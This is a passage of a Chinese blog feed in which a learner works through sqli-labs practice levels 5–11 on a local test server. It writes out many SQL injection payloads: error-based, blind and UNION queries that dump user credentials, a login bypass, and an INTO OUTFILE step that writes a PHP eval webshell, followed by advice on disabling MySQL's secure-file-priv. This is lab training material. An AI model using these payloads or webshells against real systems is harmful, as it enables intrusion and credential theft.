src="https://img-blog.csdnimg.cn/20200229171926158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>最后爆值，</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0</span>"<span class="token punctuation">)</span> union select <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> users<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200229172655963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">OK，收工~<br>学习感受：感觉emmmmmm, 非常有趣，说实话，我是个笨蛋，没别人记得快，我做了好多遍才记住这个步骤的，做的时候呢……忘这忘那的，很粗心，做不好又非常着急，特别容易紧张，脑子就不知道怎么想了。不过我并不比别人差，说不定他们也是练得比较多，付出的努力更多呢。而且我对这个很感兴趣，都说兴趣是最好的老师，付出肯定会得到回报，给自己喊句奥利给！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs闯关续</title>
      <link href="/posts/74aec6cc/"/>
      <url>/posts/74aec6cc/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Web题中SQL注入是最重要的类型之一。之前只是简单的了解， SQL注入对于我这样的新手来说可能会有一点难度，当时学的时候学习了sqli-labs的前四关，现在重新捡起，继续打。</p><h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><p>目前我了解到两种方法。</p><h2 id="第一种方法——报错型注入"><a href="#第一种方法——报错型注入" class="headerlink" title="第一种方法——报错型注入"></a>第一种方法——报错型注入</h2><h3 id="旧方法"><a href="#旧方法" class="headerlink" title="旧方法"></a>旧方法</h3><p>肯定是有注入的，所以判断是否有注入就省去了。判断闭合符号是单引号</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p>可报错并显示出数据库。<br><img src="https://img-blog.csdnimg.cn/20200418005040402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>显示表名，</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>security'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005115158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆列名</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005135190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>爆数据：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">and</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">%</span><span class="token number">20</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005150512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>没显示完，还有下一步，再爆后面的数据，用mid函数。</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005223199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="新get"><a href="#新get" class="headerlink" title="新get"></a>新get</h3><p>还有一个语句可以实现，看到了就顺便总结下来：<br>爆数据库名：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005241778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆表名，可以通过limit函数爆出目标数据表名：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005255803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆列名，同样是用limit函数进行选择列爆破：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name='</span>users' <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005317660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆数据值：</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005335218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="第二种——盲注"><a href="#第二种——盲注" class="headerlink" title="第二种——盲注"></a>第二种——盲注</h2><p>判断数据库长度</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and length(database())>0--+?id=1'</span> <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005354638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>数据库长度判断出来，下一步爆库名</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005411373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这样判断太慢，直接burp爆破就行，之前尝试的burp爆破是一个post类型，这次是get类型，所以就再总结一下</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">100</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005429901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>设置好开始爆破<br><img src="https://img-blog.csdnimg.cn/20200418005459760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后放到一个转ascii码的小工具里转换<br><img src="https://img-blog.csdnimg.cn/20200418005513567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以爆出数据库名。<br>其他的只需改动语句，爆破方式一样。只是比较慢。<br>脚本暂时还不会写，先放着，学会了再补充。</p><h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><p>双引号闭合，其他的与第五关相同，照抄OK。</p><h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><p>对于我来说时一种新的注入方式，<br>判断闭合符号。</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005532728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>闭合符号是<code>&#39;))</code>,试着上传一句话木马，<br>路径不知道，先拿个简单关查看下路径（做题的时候要靠自己找，刚了解到，我也没见过这类题，所以见到再说）<br>payload</p><pre class="language-sql'" data-language="sql'"><code class="language-sql'">?id&#x3D;-1 union select 1,@@basedir,@@datadir --+</code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005634601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">')) union select 1,2,'</span><span class="token operator">&lt;</span>?php <span class="token variable">@eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"lxj"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>' <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\lxj.php"</span><span class="token comment">--+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200418005727416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>回显报错了,看师傅们的博客是：虽然报错了，但是在本地文件是可以看到上传成功的，可是为什么我的就没有。<br><img src="https://img-blog.csdnimg.cn/20200418005750452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>奇怪，啥都没有。再百度看了好几篇博客，终于找到了解决办法，是我本地的mysql没有写入权限。所以没有办法上传成功，解决办法也是尝试过好几遍才对了。<br>解决办法如下：<br>打开mysql目录找到<code>my.in</code>这个文件，<br><img src="https://img-blog.csdnimg.cn/20200418005807306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><p>打开这个文件：添加<code>secure-file-priv =&quot;&quot;</code>保存<br>一般出现没有写入权限的问题的应该就是缺少了。直接加一个就行。（反正我的是没有这句话。）只针对这一种情况，其他的不好说。<img src="https://img-blog.csdnimg.cn/20200418011558846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后再重新写入php文件，但是再看还是没有任何东西，然后又查百度，找了三四遍博客终于让我找到了我错在哪里了。原来就是一个低级错误，保存之后记得重新启动mysql。再次上传php就行。<br>这次就上传成功了。<br><img src="https://img-blog.csdnimg.cn/20200418005825967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>运行一下看看，<br><img src="https://img-blog.csdnimg.cn/20200418005840458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以，那就用菜刀或者蚁剑连接。<br><a href="http://127.0.0.1/sqli-labs-master/Less-13/">http://127.0.0.1/sqli-labs-master/Less-13/</a><br>添加成功，连上了。<br><img src="https://img-blog.csdnimg.cn/20200418005939200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>查看一下<br><img src="https://img-blog.csdnimg.cn/2020041800595898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>ok木得问题，过关。</p><h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><p>这道题是布尔盲注<br>看题目单引号闭合，试一下<br><img src="https://img-blog.csdnimg.cn/20200418010014164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>但是这道题可以使用第七关的方法上传一个木马，用蚁剑或菜刀连接。步骤略，看结果<br><img src="https://img-blog.csdnimg.cn/20200418010035265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看了可以，那就不管它了。<br>在回头说盲注，盲注是布尔盲注，可以用手注，也可以用burp爆破。跟第五关差不多，不再重复</p><h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p>看题是基于单引号闭合的时间盲注<br>反正也没事试一遍，发现确实是不管payload是什么，都会回显<code>You are in ......</code><br>想起来之前第九关和第十关差不多，第十关以前总结过，再回头看一下。就不再重新写一遍了。<br>只是第十关是双引号闭合，其他的一样，没什么差别。<br>额咳咳，出于好奇，我又闲着试试，第九关能不能传入木马，结果还真成功了<br><img src="https://img-blog.csdnimg.cn/20200418010053763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>啊哈，意外之喜。第十关应该也行。</p><h1 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h1><p>只标题。就试试可不可以传入木马就行了，顺便连接一下。<br><img src="https://img-blog.csdnimg.cn/20200418010114443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>蚁剑连接<br><img src="https://img-blog.csdnimg.cn/20200418010153369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>成功了，开心哈。</p><h1 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h1><p>从这一关往后是post类型的注入。之前只了解过万能密码<br>随便输入账户密码都输入admin，登录成功。<br><img src="https://img-blog.csdnimg.cn/20200418010806863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后再输入账户<code>lalala</code>密码<code>1234</code>，发现有报错，<br><img src="https://img-blog.csdnimg.cn/20200418010823268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这就能证明本关的确是报错注入。</p><h2 id="第一种姿势"><a href="#第一种姿势" class="headerlink" title="第一种姿势"></a>第一种姿势</h2><p>万能密码<br>username：<code>admin&#39;#</code>，密码随意。<br><img src="https://img-blog.csdnimg.cn/20200418010839132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆数据库</p><pre class="language-payload" data-language="payload"><code class="language-payload">admin&#39; and extractvalue(1,concat(0x7e,database(),0x7e))#admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code></pre><p>两句均可，就全部记了下来，网上大佬的博客很多，不同的姿势也好几个，这里暂时总结几种我学会的吧。<br><img src="https://img-blog.csdnimg.cn/20200418010904443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆数据表名</p><pre class="language-payload" data-language="payload"><code class="language-payload">admin&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),0x7e))#</code></pre><p>limit决定爆哪个表<br><img src="https://img-blog.csdnimg.cn/20200418010924363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第三个表爆出<code>users</code>，可进行下一步，爆列名</p><pre class="language-payload" data-language="payload"><code class="language-payload">admin&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 1,1),0x7e))#</code></pre><p><img src="https://img-blog.csdnimg.cn/20200418010937339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><pre class="language-payload" data-language="payload"><code class="language-payload">admin&#39; and extractvalue(1,concat(0x7e,(select username from users limit 1,1),0x7e))#</code></pre><p>limit决定爆哪个信息<br><img src="https://img-blog.csdnimg.cn/2020041801094958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="第二种姿势"><a href="#第二种姿势" class="headerlink" title="第二种姿势"></a>第二种姿势</h2><p>随便构造账户名和密码。然后进行抓包<br><img src="https://img-blog.csdnimg.cn/20200418011023949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>发送到<code>Repeater</code></p><pre class="language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&#39; and 1&#x3D;1%23 &amp;passwd&#x3D;1234&amp;submit&#x3D;Submit</code></pre><p><img src="https://img-blog.csdnimg.cn/20200418011043508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆数据库名</p><pre class="language-payload" data-language="payload"><code class="language-payload">uname&#x3D;0&#39; union select 1,database()%23 &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</code></pre><p><img src="https://img-blog.csdnimg.cn/20200418011106279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆表名</p><pre class="language-payload" data-language="payload"><code class="language-payload">uname&#x3D;0&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;%23 &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</code></pre><p><img src="https://img-blog.csdnimg.cn/20200418011122761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>爆出四张表，然后根据前几关的套路可查询<code>users</code></p><pre class="language-payload" data-language="payload"><code class="language-payload">uname&#x3D;0&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;%23 &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</code></pre><p><img src="https://img-blog.csdnimg.cn/20200418011133807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>同时查询<code>username</code>和<code>password</code>。</p><pre class="language-payload" data-language="payload"><code class="language-payload">uname&#x3D;0&#39; union select group_concat(username),group_concat(password) from users%23 &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</code></pre><p><img src="https://img-blog.csdnimg.cn/20200418011145704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到这么多数据。get！！</p><h1 id="第十二关"><a href="#第十二关" class="headerlink" 